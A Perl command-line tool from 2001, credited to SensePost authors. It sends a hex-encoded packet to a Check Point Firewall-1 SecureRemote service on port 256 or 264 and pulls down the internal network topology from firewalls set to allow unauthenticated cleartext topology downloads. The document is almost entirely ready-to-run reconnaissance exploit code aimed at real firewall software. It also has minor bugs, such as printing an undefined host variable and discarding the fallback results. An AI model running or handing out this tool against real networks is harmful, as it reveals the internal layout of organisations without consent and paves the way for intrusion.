#!/usr/bin/perl
# A Command-line tool that can be used to download network Topology
# from Firewall-1's running SecureRemote, with the option "Allow un
# authenticated cleartext topology downloads".
# Usage sr.pl IP
# Haroon Meer & Roelof Temmingh 2001/07/17
# haroon@sensepost.com - http://www.sensepost.com

use Socket;
if ($#ARGV<0) {die "Usage: sr.pl IP\n";}

$port=256;
$target=inet_aton($ARGV[0]);
print "Testing $host on port $port\n";

$SENDY="410000000259052100000004c41e43520000004e28746f706f6c6f67792d726571756573740a093a63616e616d6520282d53656e7365506f73742d646f74
636f6d2d290a093a6368616c6c656e67652028633265323331383339643066290a290a00";
$SENDY = pack("H*",$SENDY);

@results=sendraw($SENDY);

if ($#results == 0) {
 print "No results on port 256 - trying 264\n";
 $port=264;
 @results2=sendraw($SENDY); 
 if ($#results2 == 0) {die "Sorry - no results\n";}
} else {print @results;}

sub sendraw {
 my ($pstr)=@_;
 socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) || die("Socket problems\n");
 if(connect(S,pack "SnA4x8",2,$port,$target)){
  my @in;
  select(S);      $|=1;   print $pstr;
  while(<S>){ push @in, $_;}
  select(STDOUT); close(S); return @in;
 } else { return ""; }
}
# Spidermark: sensepostdata fw1
